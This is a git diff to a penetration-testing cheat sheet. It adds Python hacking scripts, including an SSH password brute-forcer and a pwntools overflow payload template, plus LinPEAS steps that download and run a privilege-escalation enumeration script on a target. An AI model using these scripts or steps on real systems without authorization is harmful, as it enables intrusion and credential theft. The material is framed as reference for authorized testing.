@@ -23,6 +23,7 @@ Ensure the following tools are installed before running the commands:
 - **assetfinder**, **dnsx**, **anubis**, **sherlock**, **spiderfoot**, **metagoofil**, **linkedin2username**, **h8mail**, **dnstwist**, **altdns**, **findomain**, **asnlookup**, **masscan**, **naabu**, **massdns**, **fierce**, **dnsvalidator**, **puredns**, **shuffledns**, **hosthunter**, **dirsearch**, **gospider**, **hakrawler**, **httprobe**, **httpx**, **paramspider**, **arjun**, **linkfinder**, **403bypasser**, **nuclei**, **wapiti**, **dalfox**, **xsstrike**, **jaeles**, **burpsuite**, **owasp zap**, **sslscan**, **waybackurls**, **gau**, **katana**, **gowitness**: Additional recon tools
 - **John the Ripper**: Password cracking tool (`john`)
 - **Hashcat**: Advanced password recovery tool (`hashcat`)
+- **LinPEAS**: Linux privilege escalation scanner (`linpeas.sh`)
 
 Install tools using your package manager (e.g., `apt`, `brew`) or follow official documentation. Wordlists like `dirbuster`, `seclists`, and `rockyou.txt` are required for tools like `gobuster`, `john`, and `hashcat`.
 
@@ -89,11 +90,6 @@ tshark -Y 'http.request.method == "GET"' -i eth0  # Analyze network traffic, cap
 Finally, focus on web applications to discover directories, parameters, endpoints, and vulnerabilities. These tools are specific to web targets.
 
 ```bash
-python3 -m http.server
-python3 -m venv /work/venv
-source /work/venv/bin/activate
-deactivate
-
 whatweb domain.com  # Identify web technologies
 nikto -h domain.com  # Scan for web server vulnerabilities
 urlfinder -d domain.com -o domain.txt  # Find URLs on the target
@@ -128,12 +124,108 @@ owasp zap  # Widely used web vulnerability scanner (GUI tool)
 
 ### Python
 
+Python is a powerful language for hacking, offering libraries for network scanning, web scraping, packet crafting, and automation. Below are commonly used Python commands and scripts for hacking tasks. Ensure you have the required libraries installed (e.g., `pip install requests scapy paramiko beautifulsoup4 pwntools`).
+
 ```bash
-python3 -m http.server
-python3 -m venv /work/venv
-source /work/venv/bin/activate
-deactivate
+python3 -m http.server  # Start a simple HTTP server for file sharing or testing
+python3 -m venv /work/venv  # Create a virtual environment for isolated Python projects
+source /work/venv/bin/activate  # Activate the virtual environment
+deactivate  # Exit the virtual environment
+pip install requests scapy paramiko beautifulsoup4 pwntools  # Install common hacking libraries
 ```
+
+#### Example Python Scripts for Hacking
+
+1. **Port Scanner (Using `socket`)**  
+   A simple script to scan open ports on a target host.
+
+   ```python
+   import socket
+   import sys
+
+   target = input("Enter target IP: ")
+   ports = range(1, 1000)
+
+   for port in ports:
+       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+       sock.settimeout(1)
+       result = sock.connect_ex((target, port))
+       if result == 0:
+           print(f"Port {port} is open")
+       sock.close()
+   ```
+
+2. **Web Scraper (Using `requests` and `beautifulsoup4`)**  
+   Extract links from a website for reconnaissance.
+
+   ```python
+   import requests
+   from bs4 import BeautifulSoup
+
+   url = input("Enter target URL (e.g., http://example.com): ")
+   response = requests.get(url)
+   soup = BeautifulSoup(response.text, 'html.parser')
+
+   for link in soup.find_all('a'):
+       href = link.get('href')
+       if href:
+           print(href)
+   ```
+
+3. **SSH Brute Force (Using `paramiko`)**  
+   Attempt to brute-force SSH credentials (use with permission only).
+
+   ```python
+   import paramiko
+   import sys
+
+   target = input("Enter target IP: ")
+   username = input("Enter username: ")
+   password_file = input("Enter password file path: ")
+
+   with open(password_file, 'r') as file:
+       for password in file:
+           password = password.strip()
+           try:
+               ssh = paramiko.SSHClient()
+               ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+               ssh.connect(target, username=username, password=password)
+               print(f"Success! Password: {password}")
+               ssh.close()
+               break
+           except:
+               print(f"Failed: {password}")
+   ```
+
+4. **Packet Sniffer (Using `scapy`)**  
+   Capture and analyze network packets.
+
+   ```python
+   from scapy.all import *
+
+   def packet_callback(packet):
+       if packet.haslayer(IP):
+           ip_src = packet[IP].src
+           ip_dst = packet[IP].dst
+           print(f"Packet: {ip_src} -> {ip_dst}")
+
+   sniff(iface="eth0", prn=packet_callback, count=10)
+   ```
+
+5. **Exploit Development (Using `pwntools`)**  
+   Template for interacting with a binary or remote service.
+
+   ```python
+   from pwn import *
+
+   binary = './vulnerable'
+   p = process(binary)  # Or remote('domain.com', 1337)
+   payload = b'A' * 64 + p64(0xdeadbeef)
+   p.sendline(payload)
+   p.interactive()
+   ```
+
+These scripts require the respective libraries and should be used responsibly on authorized systems only.
 
 ---
 
@@ -215,6 +307,53 @@ crontab -l  # List cron jobs to check for persistence opportunities
 
 ---
 
+## LinPEAS (Linux Privilege Escalation Awesome Script)
+
+LinPEAS is a powerful script for enumerating potential privilege escalation vectors on Linux systems. It checks for misconfigurations, vulnerable services, weak permissions, and other exploitable conditions. Download it from [GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).
+
+### Usage
+
+1. **Download LinPEAS**  
+   Transfer the script to the target system (e.g., via `scp`, `wget`, or `curl`).
+
+   ```bash
+   wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+   ```
+
+2. **Make Executable**  
+   Grant execute permissions to the script.
+
+   ```bash
+   chmod +x linpeas.sh
+   ```
+
+3. **Run LinPEAS**  
+   Execute the script to perform a comprehensive enumeration. Redirect output to a file for easier analysis.
+
+   ```bash
+   ./linpeas.sh > linpeas_output.txt
+   ```
+
+4. **Key Checks Performed by LinPEAS**  
+   - System information (kernel version, OS, hostname)
+   - User and group enumeration (SUID/GUID binaries, sudo permissions)
+   - File and directory permissions (writable files, sensitive configs)
+   - Network information (open ports, listening services)
+   - Cron jobs and scheduled tasks
+   - Installed software and potential vulnerabilities
+   - Cloud service misconfigurations (AWS, GCP, Azure)
+
+5. **Analyze Output**  
+   Review the output for highlighted issues (e.g., red/yellow text for critical findings). Focus on:
+   - Writable configuration files
+   - SUID binaries with known exploits
+   - Weak sudo permissions
+   - Exposed credentials in files or environment variables
+
+**Note**: LinPEAS is noisy and may be detected by security tools. Use it only on systems you are authorized to test. Always save the output for detailed analysis.
+
+---
+
 ## Fun Stuff
 
 Miscellaneous commands for playful or experimental purposes.
@@ -241,6 +380,7 @@ Explore these resources for further learning, tool documentation, and password c
 - [CrackStation](https://crackstation.net/) for online hash lookup and password cracking dictionaries
 - [CyberChef](https://gchq.github.io/CyberChef/) for encryption, encoding, compression, and data analysis
 - [Cryptii](https://cryptii.com/) for modular text transformation and encoding/decoding
+- [LinPEAS GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) for privilege escalation
 
 ---
 
